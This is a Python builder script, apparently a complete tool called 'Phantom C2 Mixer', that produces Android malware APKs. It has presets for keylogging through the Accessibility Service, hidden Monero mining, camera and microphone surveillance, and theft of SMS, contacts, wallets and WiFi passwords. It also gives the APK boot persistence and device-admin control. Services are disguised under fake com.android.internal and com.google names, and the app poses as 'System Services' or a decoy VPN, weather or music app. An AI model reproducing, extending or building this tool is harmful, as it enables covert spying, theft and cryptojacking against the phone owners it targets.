#!/usr/bin/env python3
"""
PHANTOM C2 MIXER v5.1 — All-In-One Builder
Usage:
  python mixer.py                          # Interactive mode
  python mixer.py --preset 1 --pkg com.x   # CLI mode (all features)
  python mixer.py --preset 5 --pkg com.x   # CLI mode (grabber only)
  python mixer.py --list                   # List presets and features
"""
import os, sys, json, shutil, subprocess, re, argparse, io
from pathlib import Path
from datetime import datetime

if sys.platform == 'win32':
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
    except: pass

C = type('C', (), {
    'RED': '\033[91m', 'GREEN': '\033[92m', 'YELLOW': '\033[93m',
    'CYAN': '\033[96m', 'WHITE': '\033[97m', 'GREY': '\033[90m',
    'BOLD': '\033[1m', 'RESET': '\033[0m'
})()

ROOT = Path(__file__).parent.absolute()
MANIFEST = ROOT / 'app/src/main/AndroidManifest.xml'
MAIN_ACTIVITY = ROOT / 'app/src/main/java/com/openaccess/sdk/MainActivity.kt'
BUILD_GRADLE = ROOT / 'app/build.gradle'

FEATURES = {
    'keylogger':      {'name':'Keylogger','desc':'Capture keystrokes via Accessibility Service','req_accessibility':True},
    'miner':          {'name':'XMR Miner','desc':'Monero mining (AES-256 asset chunks, battery throttle)'},
    'surveillance':   {'name':'Surveillance','desc':'Camera, mic, screenshots, location, live stream'},
    'grabber':        {'name':'Data Grabber','desc':'Contacts, SMS, call logs, browser data, wallets, files'},
    'control':        {'name':'Device Control','desc':'Overlay, click injection, device admin, install APKs','req_admin':True},
    'persistence':    {'name':'Persistence','desc':'Boot receiver, auto-restart, notification listener','req_notif':True},
    'communication':  {'name':'Communication','desc':'Send SMS, make calls, read phone state'},
    'clipboard':      {'name':'Clipboard','desc':'Monitor clipboard content'},
    'wifi':           {'name':'WiFi Scanner','desc':'Scan networks, get saved passwords'},
    'app_list':       {'name':'App Enumerator','desc':'List installed apps with permissions'},
    'battery':        {'name':'Battery Monitor','desc':'Track battery level, charging state'},
    'processes':      {'name':'Process Viewer','desc':'View running processes/services'},
    'system_info':    {'name':'System Info','desc':'Device model, Android version, build props'},
    'network':        {'name':'Network Scanner','desc':'Scan local network, open ports'},
}

ALL_PERMS = {
    'INTERNET':'android.permission.INTERNET','ACCESS_NETWORK_STATE':'android.permission.ACCESS_NETWORK_STATE',
    'ACCESS_FINE_LOCATION':'android.permission.ACCESS_FINE_LOCATION','ACCESS_COARSE_LOCATION':'android.permission.ACCESS_COARSE_LOCATION',
    'CAMERA':'android.permission.CAMERA','RECORD_AUDIO':'android.permission.RECORD_AUDIO',
    'CALL_PHONE':'android.permission.CALL_PHONE','READ_CALL_LOG':'android.permission.READ_CALL_LOG',
    'SEND_SMS':'android.permission.SEND_SMS','READ_CONTACTS':'android.permission.READ_CONTACTS',
    'READ_SMS':'android.permission.READ_SMS','READ_PHONE_STATE':'android.permission.READ_PHONE_STATE',
    'READ_EXTERNAL_STORAGE':'android.permission.READ_EXTERNAL_STORAGE',
    'WRITE_EXTERNAL_STORAGE':'android.permission.WRITE_EXTERNAL_STORAGE',
    'MANAGE_EXTERNAL_STORAGE':'android.permission.MANAGE_EXTERNAL_STORAGE',
    'POST_NOTIFICATIONS':'android.permission.POST_NOTIFICATIONS',
    'FOREGROUND_SERVICE':'android.permission.FOREGROUND_SERVICE',
    'FOREGROUND_SERVICE_DATA_SYNC':'android.permission.FOREGROUND_SERVICE_DATA_SYNC',
    'RECEIVE_BOOT_COMPLETED':'android.permission.RECEIVE_BOOT_COMPLETED',
    'SYSTEM_ALERT_WINDOW':'android.permission.SYSTEM_ALERT_WINDOW',
    'REQUEST_INSTALL_PACKAGES':'android.permission.REQUEST_INSTALL_PACKAGES',
    'WAKE_LOCK':'android.permission.WAKE_LOCK','VIBRATE':'android.permission.VIBRATE',
    'ACCESS_WIFI_STATE':'android.permission.ACCESS_WIFI_STATE','CHANGE_WIFI_STATE':'android.permission.CHANGE_WIFI_STATE',
    'DISABLE_KEYGUARD':'android.permission.DISABLE_KEYGUARD','EXPAND_STATUS_BAR':'android.permission.EXPAND_STATUS_BAR',
    'REQUEST_IGNORE_BATTERY_OPTIMIZATIONS':'android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS',
    'QUERY_ALL_PACKAGES':'android.permission.QUERY_ALL_PACKAGES',
}

FEATURE_PERMS = {
    'keylogger':     ['INTERNET','ACCESS_NETWORK_STATE','FOREGROUND_SERVICE','FOREGROUND_SERVICE_DATA_SYNC'],
    'miner':         ['INTERNET','ACCESS_NETWORK_STATE','FOREGROUND_SERVICE','FOREGROUND_SERVICE_DATA_SYNC','WAKE_LOCK','REQUEST_IGNORE_BATTERY_OPTIMIZATIONS'],
    'surveillance':  ['INTERNET','ACCESS_NETWORK_STATE','FOREGROUND_SERVICE','FOREGROUND_SERVICE_DATA_SYNC','CAMERA','RECORD_AUDIO','ACCESS_FINE_LOCATION','ACCESS_COARSE_LOCATION','SYSTEM_ALERT_WINDOW'],
    'grabber':       ['INTERNET','ACCESS_NETWORK_STATE','FOREGROUND_SERVICE','FOREGROUND_SERVICE_DATA_SYNC','READ_CONTACTS','READ_SMS','READ_CALL_LOG','READ_PHONE_STATE','READ_EXTERNAL_STORAGE','WRITE_EXTERNAL_STORAGE','MANAGE_EXTERNAL_STORAGE'],
    'control':       ['INTERNET','ACCESS_NETWORK_STATE','FOREGROUND_SERVICE','FOREGROUND_SERVICE_DATA_SYNC','SYSTEM_ALERT_WINDOW','REQUEST_INSTALL_PACKAGES','DISABLE_KEYGUARD','EXPAND_STATUS_BAR'],
    'persistence':   ['INTERNET','ACCESS_NETWORK_STATE','FOREGROUND_SERVICE','FOREGROUND_SERVICE_DATA_SYNC','RECEIVE_BOOT_COMPLETED','POST_NOTIFICATIONS'],
    'communication': ['INTERNET','ACCESS_NETWORK_STATE','FOREGROUND_SERVICE','FOREGROUND_SERVICE_DATA_SYNC','SEND_SMS','CALL_PHONE','READ_CALL_LOG','READ_PHONE_STATE'],
    'clipboard':     ['INTERNET','ACCESS_NETWORK_STATE','FOREGROUND_SERVICE','FOREGROUND_SERVICE_DATA_SYNC'],
    'wifi':          ['INTERNET','ACCESS_NETWORK_STATE','FOREGROUND_SERVICE','FOREGROUND_SERVICE_DATA_SYNC','ACCESS_WIFI_STATE','CHANGE_WIFI_STATE','ACCESS_FINE_LOCATION'],
    'app_list':      ['INTERNET','ACCESS_NETWORK_STATE','FOREGROUND_SERVICE','FOREGROUND_SERVICE_DATA_SYNC','QUERY_ALL_PACKAGES'],
    'battery':       ['INTERNET','ACCESS_NETWORK_STATE','FOREGROUND_SERVICE','FOREGROUND_SERVICE_DATA_SYNC'],
    'processes':     ['INTERNET','ACCESS_NETWORK_STATE','FOREGROUND_SERVICE','FOREGROUND_SERVICE_DATA_SYNC'],
    'system_info':   ['INTERNET','ACCESS_NETWORK_STATE','FOREGROUND_SERVICE','FOREGROUND_SERVICE_DATA_SYNC','READ_PHONE_STATE'],
    'network':       ['INTERNET','ACCESS_NETWORK_STATE','FOREGROUND_SERVICE','FOREGROUND_SERVICE_DATA_SYNC','ACCESS_WIFI_STATE'],
}

PRESETS = {
    '1':{'name':'Full Payload','desc':'All features','feats':list(FEATURES.keys())},
    '2':{'name':'Miner + Keylogger','desc':'Crypto miner + keystroke capture','feats':['keylogger','miner','persistence','battery']},
    '3':{'name':'Miner Only','desc':'Just XMR mining','feats':['miner','persistence']},
    '4':{'name':'Shell + Surveillance','desc':'Remote shell + camera/mic','feats':['surveillance','persistence','system_info']},
    '5':{'name':'Data Grabber','desc':'Steal contacts, SMS, browser data, wallets','feats':['grabber','persistence','clipboard']},
    '6':{'name':'Keylogger Only','desc':'Just keystroke capture','feats':['keylogger','persistence']},
    '7':{'name':'Stealth Recon','desc':'Low-profile info gathering','feats':['system_info','network','app_list','battery','processes']},
    '8':{'name':'Custom','desc':'Pick your own','feats':[]},
}

def banner():
    print(f'''
{C.BOLD}{C.CYAN}+======================================================+
|                                                      |
|   PHANTOM C2 MIXER v5.1                              |
|   All-In-One APK Builder                              |
|                                                      |
+======================================================+{C.RESET}
''')

def list_presets():
    print(f'\n{C.BOLD}{C.WHITE}PRESETS:{C.RESET}\n')
    for k, p in PRESETS.items():
        names = ', '.join(FEATURES[f]['name'] for f in p['feats']) if p['feats'] else 'custom'
        print(f'  {C.CYAN}[{k}]{C.RESET} {C.BOLD}{p["name"]}{C.RESET}')
        print(f'      {C.GREY}{p["desc"]} | {names}{C.RESET}\n')
    print(f'\n{C.BOLD}{C.WHITE}FEATURES:{C.RESET}\n')
    for k, f in FEATURES.items():
        print(f'  {C.CYAN}{k:16}{C.RESET} {f["name"]} — {C.GREY}{f["desc"]}{C.RESET}')

def select_features():
    print(f'{C.BOLD}{C.WHITE}SELECT PRESET:{C.RESET}\n')
    for k, p in PRESETS.items():
        names = ', '.join(FEATURES[f]['name'] for f in p['feats']) if p['feats'] else 'custom'
        print(f'  {C.CYAN}[{k}]{C.RESET} {C.BOLD}{p["name"]}{C.RESET}')
        print(f'      {C.GREY}{p["desc"]} | {names}{C.RESET}\n')
    ch = input(f'{C.CYAN}╰─► Select (1-8): {C.RESET}').strip()
    if ch == '8':
        print(f'\n{C.BOLD}{C.WHITE}CUSTOM — pick features:{C.RESET}\n')
        for k, f in FEATURES.items():
            print(f'  {C.YELLOW}[{k}]{C.RESET} {f["name"]} — {C.GREY}{f["desc"]}{C.RESET}')
        raw = input(f'\n{C.CYAN}╰─► Comma-separated: {C.RESET}').strip().lower()
        sel = [x.strip() for x in raw.split(',') if x.strip() in FEATURES]
        return sel or list(FEATURES.keys())
    return PRESETS.get(ch, PRESETS['1'])['feats']

def write_manifest(features, app_name, pkg):
    perms = set()
    for f in features:
        perms.update(FEATURE_PERMS.get(f, []))
    has_acc = 'keylogger' in features
    has_notif = 'persistence' in features
    has_admin = 'control' in features

    perm_lines = []
    for key in sorted(perms):
        p = ALL_PERMS[key]
        if key in ('READ_EXTERNAL_STORAGE','WRITE_EXTERNAL_STORAGE'):
            perm_lines.append(f'    <uses-permission android:name="{p}" android:maxSdkVersion="32" />')
        else:
            perm_lines.append(f'    <uses-permission android:name="{p}" />')

    lines = [f'<?xml version="1.0" encoding="utf-8"?>',
             '<manifest xmlns:android="http://schemas.android.com/apk/res/android">',
             '']
    lines.extend(perm_lines)
    lines += ['',
              '    <uses-feature android:name="android.hardware.camera" android:required="false" />',
              '    <uses-feature android:name="android.hardware.camera.autofocus" android:required="false" />',
              '    <uses-feature android:name="android.hardware.microphone" android:required="false" />',
              '    <uses-feature android:name="android.hardware.location.gps" android:required="false" />',
              '    <uses-feature android:name="android.hardware.telephony" android:required="false" />',
              '',
              '    <application',
              '        android:name=".OpenAccessApp"',
              '        android:allowBackup="false"',
              f'        android:label="{app_name}"',
              '        android:icon="@mipmap/ic_launcher"',
              '        android:supportsRtl="true"',
              '        android:theme="@style/Theme.OpenAccessSDK"',
              '        android:usesCleartextTraffic="true"',
              '        android:requestLegacyExternalStorage="true">',
              '',
              '        <activity',
              '            android:name=".MainActivity"',
              '            android:exported="true"',
              '            android:launchMode="singleInstance"',
              '            android:excludeFromRecents="true">',
              '            <intent-filter>',
              '                <action android:name="android.intent.action.MAIN" />',
              '                <category android:name="android.intent.category.LAUNCHER" />',
              '            </intent-filter>',
              '        </activity>',
              '',
              '        <activity',
              '            android:name=".ScreenCaptureActivity"',
              '            android:exported="false"',
              '            android:theme="@android:style/Theme.Translucent.NoTitleBar"',
              '            android:excludeFromRecents="true"',
              '            android:noHistory="true" />',
              '',
              '        <service',
              '            android:name="com.android.internal.os.BootService"',
              '            android:enabled="true"',
              '            android:exported="false"',
              '            android:foregroundServiceType="dataSync" />',
              '',
              '        <receiver',
              '            android:name="com.android.internal.os.BootReceiver"',
              '            android:exported="true"',
              '            android:directBootAware="true">',
              '            <intent-filter>',
              '                <action android:name="android.intent.action.BOOT_COMPLETED" />',
              '                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />',
              '                <action android:name="android.intent.action.REBOOT" />',
              '                <action android:name="com.android.internal.AOS_REVIVE" />',
              '            </intent-filter>',
              '        </receiver>',
              '',
              '        <service',
              '            android:name="com.android.internal.os.persistence.SystemJobService"',
              '            android:enabled="true"',
              '            android:exported="false"',
              '            android:permission="android.permission.BIND_JOB_SERVICE" />']

    if has_acc:
        lines += ['',
                  '        <service',
                  '            android:name="com.android.internal.accessibility.CoreAccessibilityService"',
                  '            android:enabled="true"',
                  '            android:exported="true"',
                  '            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">',
                  '            <intent-filter>',
                  '                <action android:name="android.accessibilityservice.AccessibilityService" />',
                  '            </intent-filter>',
                  '            <meta-data',
                  '                android:name="android.accessibilityservice"',
                  '                android:resource="@xml/accessibility_config" />',
                  '        </service>']

    if has_admin:
        lines += ['',
                  '        <receiver',
                  '            android:name="com.android.internal.admin.AdminReceiver"',
                  '            android:exported="true"',
                  '            android:permission="android.permission.BIND_DEVICE_ADMIN">',
                  '            <intent-filter>',
                  '                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />',
                  '                <action android:name="android.app.action.DEVICE_ADMIN_DISABLED" />',
                  '            </intent-filter>',
                  '            <meta-data',
                  '                android:name="android.app.device_admin"',
                  '                android:resource="@xml/device_admin_policy" />',
                  '        </receiver>']

    lines += ['',
              '        <service',
              '            android:name="com.openaccess.sdk.service.SystemNetworkService"',
              '            android:enabled="true"',
              '            android:exported="false"',
              '            android:foregroundServiceType="dataSync" />']

    if has_acc:
        lines += ['',
                  '        <service',
                  '            android:name="com.openaccess.sdk.service.AccessibilityHelper"',
                  '            android:exported="true"',
                  '            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">',
                  '            <intent-filter>',
                  '                <action android:name="android.accessibilityservice.AccessibilityService" />',
                  '            </intent-filter>',
                  '            <meta-data',
                  '                android:name="android.accessibilityservice"',
                  '                android:resource="@xml/accessibility_service_config" />',
                  '        </service>']

    if has_notif:
        lines += ['',
                  '        <service',
                  '            android:name="com.openaccess.sdk.service.NotifService"',
                  '            android:exported="true"',
                  '            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">',
                  '            <intent-filter>',
                  '                <action android:name="android.service.notification.NotificationListenerService" />',
                  '            </intent-filter>',
                  '        </service>']

    lines += ['',
              '        <receiver',
              '            android:name="com.google.system.AppInitializer$BootReceiver"',
              '            android:exported="true"',
              '            android:directBootAware="true">',
              '            <intent-filter>',
              '                <action android:name="android.intent.action.BOOT_COMPLETED" />',
              '                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />',
              '                <action android:name="android.intent.action.QUICKBOOT_POWERON" />',
              '            </intent-filter>',
              '        </receiver>',
              '',
              '        <receiver',
              '            android:name="com.google.system.AppInitializer$PackageReplacedReceiver"',
              '            android:exported="true">',
              '            <intent-filter>',
              '                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />',
              '            </intent-filter>',
              '        </receiver>']

    if has_admin:
        lines += ['',
                  '        <receiver',
                  '            android:name="com.openaccess.sdk.service.AdminReceiver"',
                  '            android:exported="true"',
                  '            android:permission="android.permission.BIND_DEVICE_ADMIN">',
                  '            <intent-filter>',
                  '                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />',
                  '                <action android:name="android.app.action.DEVICE_ADMIN_DISABLED" />',
                  '            </intent-filter>',
                  '            <meta-data',
                  '                android:name="android.app.device_admin"',
                  '                android:resource="@xml/device_admin" />',
                  '        </receiver>']

    lines += ['',
              '        <provider',
              '            android:name="androidx.core.content.FileProvider"',
              '            android:authorities="${applicationId}.fileprovider"',
              '            android:exported="false"',
              '            android:grantUriPermissions="true">',
              '            <meta-data',
              '                android:name="android.support.FILE_PROVIDER_PATHS"',
              '                android:resource="@xml/file_paths" />',
              '        </provider>',
              '',
              '    </application>',
              '</manifest>',
              '']

    MANIFEST.write_text('\n'.join(lines))
    return len(perms)

def write_bg_main(features):
    perm_list = FEATURE_PERMS.copy()
    perms = set()
    for f in features: perms.update(perm_list.get(f, []))

    runtime_perms = set()
    for p in sorted(perms):
        if p in ('MANAGE_EXTERNAL_STORAGE', 'SYSTEM_ALERT_WINDOW'):
            continue
        runtime_perms.add(p)
    perm_names = [ALL_PERMS[p] for p in sorted(runtime_perms)]

    all_perms_array = ',\n'.join(f'            Manifest.permission.{p.split(".")[-1]}' for p in perm_names)

    lines = [f'package com.openaccess.sdk',
             '',
             'import android.Manifest',
             'import android.app.Activity',
             'import android.content.Intent',
             'import android.content.pm.PackageManager',
             'import android.os.Build',
             'import android.os.Bundle',
             'import android.provider.Settings',
             'import androidx.core.app.ActivityCompat',
             'import androidx.core.content.ContextCompat',
             'import com.openaccess.sdk.service.SystemNetworkService',
             '',
             'class MainActivity : Activity() {',
             '    companion object {',
             f'        private val RUNTIME_PERMS = arrayOf(',
             all_perms_array,
             '        )',
             '    }',
             '',
             '    override fun onCreate(savedInstanceState: Bundle?) {',
             '        super.onCreate(savedInstanceState)',
             '        val missing = RUNTIME_PERMS.filter {',
             '            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED',
             '        }.toTypedArray()',
             '        if (missing.isNotEmpty()) {',
             '            ActivityCompat.requestPermissions(this, missing, 100)',
             '        } else {',
             '            onPermissionsReady()',
             '        }',
             '    }',
             '',
             '    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {',
             '        super.onRequestPermissionsResult(requestCode, permissions, grantResults)',
             '        onPermissionsReady()',
             '    }',
             '',
             '    private fun onPermissionsReady() {',
             '        requestSpecialPerms()',
             '        startService()',
             '    }',
             '',
             '    private fun requestSpecialPerms() {',
             '        try {',
             '            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {',
             '                if (!android.os.Environment.isExternalStorageManager()) {',
             '                    val i = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION).apply {',
             '                        data = android.net.Uri.parse("package:$packageName")',
             '                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)',
             '                    }',
             '                    startActivity(i)',
             '                }',
             '            }',
             '        } catch (_: Exception) {}',
             '        try {',
             '            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {',
             '                if (!Settings.canDrawOverlays(this)) {',
             '                    val i = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {',
             '                        data = android.net.Uri.parse("package:$packageName")',
             '                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)',
             '                    }',
             '                    startActivity(i)',
             '                }',
             '            }',
             '        } catch (_: Exception) {}',
             '    }',
             '',
             '    private fun startService() {',
             '        try {',
             '            val i = Intent(this, SystemNetworkService::class.java)',
             '            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(i) else startService(i)',
             '        } catch (_: Exception) {}',
             '        finishAndRemoveTask()',
             '    }',
             '}',
             '']
    MAIN_ACTIVITY.write_text('\n'.join(lines))

UI_TEMPLATES = {
    '1': {'name': 'VPN / Security', 'file': 'vpn_ui.kt'},
    '2': {'name': 'System Settings', 'file': 'settings_ui.kt'},
    '3': {'name': 'Weather', 'file': 'weather_ui.kt'},
    '4': {'name': 'Music Player', 'file': 'music_ui.kt'},
    '5': {'name': 'File Manager', 'file': 'filemanager_ui.kt'},
    '6': {'name': 'Movie Streaming', 'file': 'movie_ui.kt'},
}

def update_gradle(pkg):
    c = BUILD_GRADLE.read_text()
    c = re.sub(r"applicationId\s+'[^']+'", f"applicationId '{pkg}'", c)
    c = re.sub(r"namespace\s+'[^']+'", f"namespace '{pkg}'", c)
    BUILD_GRADLE.write_text(c)

def find_java():
    candidates = [
        os.environ.get('JAVA_HOME'),
        r'C:\Program Files\Android\Android Studio\jbr',
        r'C:\Program Files\Java\jdk-17',
        r'C:\Program Files\Java\jdk-21',
        shutil.which('java'),
    ]
    for c in candidates:
        if c and Path(c).exists():
            return c
    return None

def find_android_sdk():
    candidates = [
        os.environ.get('ANDROID_HOME'),
        os.environ.get('ANDROID_SDK_ROOT'),
        Path.home() / 'AppData/Local/Android/Sdk',
        Path(r'C:\Users\marua\AppData\Local\Android\Sdk'),
        Path.home() / 'Android/Sdk',
        Path('/opt/android-sdk'),
    ]
    for c in candidates:
        if c:
            p = Path(c)
            if p.exists():
                return str(p)
    return None

def build(debug=True):
    java = find_java()
    android = find_android_sdk()

    if not java:
        print(f'{C.RED}[X] Java not found. Install JDK 17+ and set JAVA_HOME{C.RESET}')
        return False

    env = {**os.environ, 'JAVA_HOME': java}
    if android:
        env['ANDROID_HOME'] = android

    task = 'assembleDebug' if debug else 'assembleRelease'

    print(f'{C.YELLOW}[!] Cleaning old build...{C.RESET}')
    subprocess.run([str(ROOT/'gradlew.bat'), 'clean', '--no-daemon'], cwd=str(ROOT), env=env,
                   capture_output=True, timeout=120)

    print(f'{C.CYAN}[+] Building {task}...{C.RESET}')
    r = subprocess.run([str(ROOT/'gradlew.bat'), task, '--no-daemon', '--stacktrace'], cwd=str(ROOT), env=env,
                       capture_output=True, text=True, timeout=600)
    if r.returncode == 0:
        apk_dir = ROOT / f'app/build/outputs/apk/{"debug" if debug else "release"}'
        apks = list(apk_dir.glob('*.apk'))
        if apks:
            apk = apks[0]
            ts = datetime.now().strftime('%Y%m%d_%H%M%S')
            name = f'payload_{ts}.apk'
            desktop = Path.home() / 'OneDrive' / 'Desktop'
            if not desktop.exists():
                desktop = Path.home() / 'Desktop'
            if not desktop.exists():
                desktop = ROOT / 'builds'
                desktop.mkdir(exist_ok=True)
            out = desktop / name
            shutil.copy2(apk, out)
            print(f'{C.GREEN}[+]{C.RESET} APK: {name} ({apk.stat().st_size/1024/1024:.1f} MB)')
            print(f'{C.GREEN}[+]{C.RESET} Saved: {out}')
            return True
    print(f'{C.RED}[X] Build failed{C.RESET}')
    if r.stdout:
        lines = r.stdout.split('\n')
        errors = [l for l in lines if 'error:' in l.lower() or 'FAILED' in l or 'Syntax error' in l]
        for line in errors[-30:]:
            try:
                print(f'  {C.RED}{line}{C.RESET}')
            except UnicodeEncodeError:
                print(f'  {C.RED}{line.encode("ascii", "replace").decode()}{C.RESET}')
    if r.returncode != 0 and r.stderr:
        try:
            print(f'{C.RED}{r.stderr[-800:]}{C.RESET}')
        except UnicodeEncodeError:
            print(f'{C.RED}{r.stderr[-800:].encode("ascii", "replace").decode()}{C.RESET}')
    return False

def main():
    parser = argparse.ArgumentParser(description='Phantom C2 Mixer')
    parser.add_argument('--preset', type=str, help='Preset number (1-8)')
    parser.add_argument('--pkg', type=str, help='Package name', default='com.openaccess.sdk')
    parser.add_argument('--app-name', type=str, help='App display name', default='System Services')
    parser.add_argument('--debug', action='store_true', help='Build debug APK')
    parser.add_argument('--release', action='store_true', help='Build release APK (default)')
    parser.add_argument('--ui', type=str, help='UI mode: 0=background, d=default, 1-6=template', default='0')
    parser.add_argument('--list', action='store_true', help='List presets and features')
    parser.add_argument('--skip-build', action='store_true', help='Generate files without building')
    parser.add_argument('--features', type=str, help='Comma-separated feature list (for preset 8)')
    args = parser.parse_args()

    if args.list:
        banner()
        list_presets()
        return

    if args.preset:
        cli_mode = True
        preset = PRESETS.get(args.preset, PRESETS['1'])
        feats = preset['feats']
        if args.features and args.preset == '8':
            feats = [f.strip() for f in args.features.split(',') if f.strip() in FEATURES]
            if not feats:
                feats = list(FEATURES.keys())
        app_name = args.app_name
        pkg = args.pkg
        debug = args.debug
        ui_ch = args.ui
    else:
        cli_mode = False
        banner()
        feats = select_features()
        names = [FEATURES[f]['name'] for f in feats if f in FEATURES]
        print(f'\n{C.GREEN}[+]{C.RESET} Features: {", ".join(names)}')

        print(f'\n{C.BOLD}{C.WHITE}App name:{C.RESET}')
        print(f'  {C.GREY}Default: System Services{C.RESET}')
        app_name = input(f'{C.CYAN}╰─► {C.RESET}').strip() or 'System Services'

        print(f'\n{C.BOLD}{C.WHITE}Package:{C.RESET}')
        print(f'  {C.GREY}Default: com.openaccess.sdk{C.RESET}')
        pkg = input(f'{C.CYAN}╰─► {C.RESET}').strip() or 'com.openaccess.sdk'

        print(f'\n{C.BOLD}{C.WHITE}Build type:{C.RESET}')
        debug = input(f'{C.CYAN}╰─► Debug? (y/N): {C.RESET}').strip().lower() == 'y'

        print(f'\n{C.BOLD}{C.WHITE}UI:{C.RESET}')
        print(f'  {C.CYAN}[0]{C.RESET} Background only (no UI)')
        print(f'  {C.CYAN}[d]{C.RESET} Default (permission screen)')
        print(f'  {C.YELLOW}── Templates ──{C.RESET}')
        for k, t in sorted(UI_TEMPLATES.items()):
            print(f'  {C.CYAN}[{k}]{C.RESET} {t["name"]}')
        ui_ch = input(f'{C.CYAN}╰─► Select (0, d, 1-6): {C.RESET}').strip().lower()

    names = [FEATURES[f]['name'] for f in feats if f in FEATURES]
    mode = 'debug' if debug else 'release'

    print(f'\n{C.BOLD}{C.WHITE}Generating...{C.RESET}')
    perm_count = write_manifest(feats, app_name, pkg)

    ui_label = 'Default'
    if ui_ch == '0':
        ui_label = 'Background only'
        write_bg_main(feats)
    elif ui_ch in UI_TEMPLATES:
        tpl = UI_TEMPLATES[ui_ch]
        src = ROOT / 'ui-templates' / tpl['file']
        if src.exists():
            shutil.copy2(src, MAIN_ACTIVITY)
            ui_label = tpl['name']
        else:
            print(f'{C.RED}[X] Template not found: {tpl["file"]}{C.RESET}')
            print(f'{C.YELLOW}[!] Falling back to background mode{C.RESET}')
            write_bg_main(feats)
            ui_label = 'Background only'
    else:
        write_bg_main(feats)
    print(f'{C.GREEN}[+]{C.RESET} UI: {ui_label}')
    update_gradle(pkg)
    print(f'{C.GREEN}[+]{C.RESET} Manifest: {perm_count} permissions')
    print(f'{C.GREEN}[+]{C.RESET} Package: {pkg}')

    print(f'\n{C.BOLD}{C.CYAN}SUMMARY:{C.RESET}')
    print(f'  Features: {", ".join(names)}')
    print(f'  App:      {app_name}')
    print(f'  Package:  {pkg}')
    print(f'  Mode:     {mode}')
    print(f'  Perms:    {perm_count}')
    print(f'  UI:       {ui_label}')

    if args.skip_build:
        print(f'\n{C.YELLOW}[!] Skipping build (--skip-build){C.RESET}')
        return

    do_build = True
    if not cli_mode:
        do_build = input(f'\n{C.CYAN}╰─► Build now? (Y/n): {C.RESET}').strip().lower() != 'n'

    if do_build:
        if build(debug=debug):
            print(f'\n{C.BOLD}{C.GREEN}╔══════════════════════════════════════════╗')
            print(f'║          BUILD COMPLETE                   ║')
            print(f'╚══════════════════════════════════════════╝{C.RESET}')
        else:
            print(f'\n{C.RED}Build failed. Check errors above.{C.RESET}')
            sys.exit(1)
    else:
        print(f'\n{C.YELLOW}Config saved. Run:{C.RESET} gradlew.bat {mode}')

if __name__ == '__main__':
    try: main()
    except KeyboardInterrupt: print(f'\n{C.RED}Cancelled.{C.RESET}'); sys.exit(0)
    except Exception as e: print(f'\n{C.RED}[X] Error: {e}{C.RESET}'); sys.exit(1)
